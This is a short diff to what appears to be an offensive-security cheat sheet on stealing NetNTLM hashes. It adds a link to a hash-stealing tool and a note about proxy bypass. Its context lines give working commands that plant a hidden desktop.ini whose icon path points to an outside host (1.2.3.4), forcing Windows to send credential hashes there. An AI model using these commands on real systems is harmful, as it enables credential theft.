@@ -46,6 +46,9 @@ echo [.ShellClassInfo] > desktop.ini <br/>
 echo IconResource\=\\\\1.2.3.4\\aa >> desktop.ini <br/>
 attrib +s +h desktop.ini
 
+## Proxy bypass adress is Intranet for NTLM auto auth
+https://github.com/Gl3bGl4z/steal_NTLM_ncat
+
 ## Dir, IE/EDGE, Office, URL, LNK, HREF, Media Player, Java web start, ClickOnce
 https://www.securify.nl/blog/SFY20180501/living-off-the-land_-stealing-netntlm-hashes.html
 
